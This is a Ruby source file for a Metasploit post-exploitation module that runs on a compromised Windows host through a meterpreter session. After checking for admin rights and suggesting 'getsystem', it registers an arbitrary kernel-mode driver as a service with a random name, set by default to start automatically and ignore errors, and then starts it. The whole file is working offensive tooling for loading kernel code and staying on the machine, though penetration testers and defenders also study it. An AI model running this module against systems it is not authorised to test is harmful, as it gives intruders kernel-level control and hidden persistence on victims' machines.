##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Error

  START_TYPE = {
    "demand"    => "SERVICE_DEMAND_START",
    "boot"      => "SERVICE_BOOT_START",
    "auto"      => "SERVICE_AUTO_START",
    "disabled"  => "SERVICE_DISABLED",
    "system"    => "SERVICE_SYSTEM_START"
  }

  ERROR_TYPE = {
    "critical"  => "SERVICE_ERROR_CRITICAL",
    "normal"    => "SERVICE_ERROR_NORMAL",
    "severe"    => "SERVICE_ERROR_SEVERE",
    "ignore"    => "SERVICE_ERROR_IGNORE"
  }

  SERVICE_TYPE = {
    "kernel"       => "SERVICE_KERNEL_DRIVER",
    "file_system"  => "SERVICE_FILE_SYSTEM_DRIVER",
    "adapter"      => "SERVICE_ADAPTER",
    "recognizer"   => "SERVICE_RECOGNIZER_DRIVER"
  }

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Driver Loader',
      'Description'   => %q{
        This module loads a KMD using the Windows Service API.
      },
      'License'       => MSF_LICENSE,
      'Author'        => 'Borja Merino <bmerinofe[at]gmail.com>',
      'Platform'      => 'windows',
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('DRIVER_PATH', [true,  'Driver path in %SYSTEMROOT%. Example: c:\\windows\\system32\\msf.sys']),
        OptString.new('DRIVER_NAME', [false, 'Driver Name.']),
        OptEnum.new('START_TYPE',    [true,  'Start type.', 'auto', [ 'boot', 'system', 'auto', 'demand','disabled']]),
        OptEnum.new('SERVICE_TYPE',  [true,  'Service type.', 'kernel', [ 'kernel', 'file_system', 'adapter', 'recognizer']]),
        OptEnum.new('ERROR_TYPE',    [true,  'Error type.', 'ignore', [ 'ignore', 'normal', 'severe', 'critical']])
      ], self.class)
  end

  def run
    driver = datastore['DRIVER_PATH']
    start = datastore['START_TYPE']
    error = datastore['ERROR_TYPE']
    service = datastore['SERVICE_TYPE']

    name = datastore['DRIVER_NAME'].blank? ? Rex::Text.rand_text_alpha((rand(8)+6)) : datastore['DRIVER_NAME']

    unless is_admin?
      print_error("You don't have enough privileges. Try getsystem.")
      return
    end

    unless driver =~ Regexp.new(Regexp.escape(expand_path("%SYSTEMROOT%")), Regexp::IGNORECASE)
      print_error("The driver must be inside %SYSTEMROOT%.")
      return
    end

    unless file_exist?(driver)
      print_error("Driver #{driver} does not exist.")
      return
    end

    inst = install_driver(driver: driver, start: start, name: name, error: error, service: service)

    if inst
      ss = service_start(name)
      case ss
      when Windows::Error::SUCCESS
        print_good("Driver loaded successfully.")
      when Windows::Error::SERVICE_ALREADY_RUNNING
        print_error("Service already started.")
      when Windows::Error::SERVICE_DISABLED
        print_error("Service disabled.")
      else
        print_error("There was an error starting the service.")
      end
    end
  end

  def install_driver(opts={})
    service_all_access = 0xF01FF
    service_type = SERVICE_TYPE[opts[:service]]
    service_error_type = ERROR_TYPE[opts[:error]]
    service_start_type = START_TYPE[opts[:start]]
    advapi32 = client.railgun.advapi32
    name = opts[:name]
    # Default access: sc_manager_all_access (0xF003F)
    ro = open_sc_manager()

    rc = advapi32.CreateServiceA(ro, name, name, service_all_access, service_type, service_start_type, service_error_type, opts[:driver], nil, nil, nil, nil, nil)
    close_sc_manager(ro)

    if rc['GetLastError'] == Windows::Error::SUCCESS
      print_status("Service object \"#{name}\" added to the Service Control Manager database.")
      close_sc_manager(rc['return'])
      return true
    elsif rc['GetLastError'] == Windows::Error::SERVICE_EXISTS
      print_error("The specified service already exists.")
      # Show ImagePath just to know if the service corresponds to the desired driver.
      service = service_info(name)
      print_error("Path of driver file in \"#{name}\" service: #{service["Command"]}.")
    else
      print_error("There was an error opening the driver handler. GetLastError=#{rc['GetLastError']}.")
    end
    return false
  end
end
